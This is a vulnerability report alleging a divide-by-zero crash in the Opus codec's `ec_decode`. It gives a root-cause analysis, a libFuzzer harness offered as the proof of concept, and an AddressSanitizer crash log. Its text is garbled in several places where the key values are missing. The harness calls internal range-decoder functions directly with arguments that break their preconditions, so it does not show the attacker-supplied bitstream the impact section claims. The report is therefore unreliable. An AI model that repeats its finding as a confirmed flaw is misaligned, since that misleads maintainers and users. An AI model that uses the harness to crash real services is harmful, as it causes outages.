# Vulnerability Report: Denial of Service in Opus via Division by Zero in `ec_decode`

## 1. Vulnerability Description

A **Division by Zero** vulnerability exists in the **Opus Audio Codec** within the range decoder component. The function `ec_decode` located in `celt/entdec.c` fails to validate the input parameter `_ft` (total frequency) before performing division operations. When an application processes a crafted input stream where `_ft` evaluates to zero, it triggers a **Floating Point Exception (FPE)**, leading to an immediate crash and Denial of Service (DoS).

## 2. Technical Analysis

The crash occurs in the entropy decoding logic. The implementation of `ec_decode` is as follows:

```c
unsigned ec_decode(ec_dec *_this, unsigned _ft) {
  unsigned s;
  _this->ext = celt_udiv(_this->rng, _ft); // Potential Division by Zero
  s = (unsigned)(_this->val / _this->ext); // Potential Division by Zero
  return _ft - EC_MINI(s + 1, _ft);
}

```

### Root Cause:

1. **Parameter `_ft` unchecked**: The function uses `_ft` as a divisor for the `celt_udiv` operation to calculate the scaling factor `ext`. If `_ft` is , a hardware division-by-zero exception is raised.
2. **Derived divisor `ext` unchecked**: Even if `_ft` is non-zero, if `_ft` is significantly larger than `_this->rng`, the result of `celt_udiv(_this->rng, _ft)` becomes . The subsequent line `_this->val / _this->ext` then results in a division by zero.
3. **Lack of Defensive Programming**: The Opus range coder assumes that the caller guarantees `_ft > 0` and `_ft <= rng`. However, internal state transitions during complex encoding/decoding sequences can lead to scenarios where these assumptions are violated, and the library provides no internal guardrails.

## 3. Impact

* **Vulnerability Type**: CWE-369 (Divide By Zero)
* **Impact**: Denial of Service (DoS). An attacker can provide a malicious bitstream that forces the decoder into a state where `_ft` becomes  during symbol decoding, crashing the service or application utilizing the Opus library.

## 4. Proof of Concept (PoC)
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "entenc.h"
#include "entdec.h"

void ec_encode(ec_ctx *_this, unsigned _fl, unsigned _fh, unsigned _ft);
unsigned ec_decode(ec_ctx *_this, unsigned _ft);
unsigned ec_decode_bin(ec_ctx *_this, unsigned _bits);
void ec_dec_update(ec_ctx *_this, unsigned _fl, unsigned _fh, unsigned _ft);

int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
    if (Size < 12) return 0;

    unsigned fl = *(unsigned*)(Data + 0);
    unsigned fh = *(unsigned*)(Data + 4);
    unsigned ft = *(unsigned*)(Data + 8);

    if (ft == 0) return 0;
    if (fl > fh) return 0;

    unsigned bits = 8;

    ec_ctx encoder;
    encoder.rng = 4294967295; // 2^32 - 1
    encoder.val = 0;

    ec_encode(&encoder, fl, fh, ft);

    ec_ctx decoder;
    decoder.rng = encoder.rng;
    decoder.val = encoder.val;

    ec_decode(&decoder, ft);
    ec_decode_bin(&decoder, bits);
    ec_dec_update(&decoder, fl, fh, ft);

    return 0;
}
```
## 5. Crash Output
```
INFO:__main__:Running: docker run --privileged --shm-size=2g --platform linux/amd64 --rm -e FUZZING_ENGINE=libfuzzer -e SANITIZER=address -e RUN_FUZZER_MODE=interactive -e HELPER=True -v /data/huangzikang/driver_test_data/opus/corpus/ec_encode-output-2/opus_repacketizer_fuzzer_fixed:/tmp/opus_repacketizer_fuzzer_fixed_corpus -v /data/huangzikang/uploadfile/oss-fuzz/build/out/ec_encode-output-2:/out -t gcr.io/oss-fuzz-base/base-runner run_fuzzer opus_repacketizer_fuzzer_fixed -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0.
vm.mmap_rnd_bits = 28
rm: cannot remove '/tmp/opus_repacketizer_fuzzer_fixed_corpus': Device or resource busy
Using seed corpus: opus_repacketizer_fuzzer_fixed_seed_corpus.zip
/out/opus_repacketizer_fuzzer_fixed -rss_limit_mb=2560 -timeout=25 -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0 /tmp/opus_repacketizer_fuzzer_fixed_corpus < /dev/null
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 3544504158
INFO: Loaded 1 modules   (261 inline 8-bit counters): 261 [0x560a5f763038, 0x560a5f76313d), 
INFO: Loaded 1 PC tables (261 PCs): 261 [0x560a5f763140,0x560a5f764190), 
INFO:       24 files found in /tmp/opus_repacketizer_fuzzer_fixed_corpus
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 1048576 bytes
INFO: seed corpus: files: 24 min: 56702b max: 6145920b total: 65091562b rss: 32Mb
AddressSanitizer:DEADLYSIGNAL
=================================================================
==13==ERROR: AddressSanitizer: FPE on unknown address 0x560a5f6f6d81 (pc 0x560a5f6f6d81 bp 0x7ffe81cc4830 sp 0x7ffe81cc4820 T0)
SCARINESS: 10 (signal)
    #0 0x560a5f6f6d81 in ec_decode /src/opus/celt/entdec.c:142:26
    #1 0x560a5f6f65df in LLVMFuzzerTestOneInput /src/opus/tests/opus_repacketizer_fuzzer.c:41:5
    #2 0x560a5f5ad2f0 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #3 0x560a5f5acb15 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool, bool*) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:516:7
    #4 0x560a5f5aeaa2 in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:829:7
    #5 0x560a5f5aed92 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:867:3
    #6 0x560a5f59decb in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:914:6
    #7 0x560a5f5c92a2 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #8 0x7f20b16d3082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #9 0x560a5f59074d in _start (/out/opus_repacketizer_fuzzer_fixed+0x3d74d)

DEDUP_TOKEN: ec_decode--LLVMFuzzerTestOneInput--fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long)
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: FPE /src/opus/celt/entdec.c:142:26 in ec_decode
==13==ABORTING
MS: 0 ; base unit: 0000000000000000000000000000000000000000
artifact_prefix='./'; Test unit written to ./crash-3932d9d61944dab1201645b8eeaad595d5705ecb
stat::number_of_executed_units: 13
stat::average_exec_per_sec:     0
stat::new_units_added:          0
stat::slowest_unit_time_sec:    0
stat::peak_rss_mb:              42
```
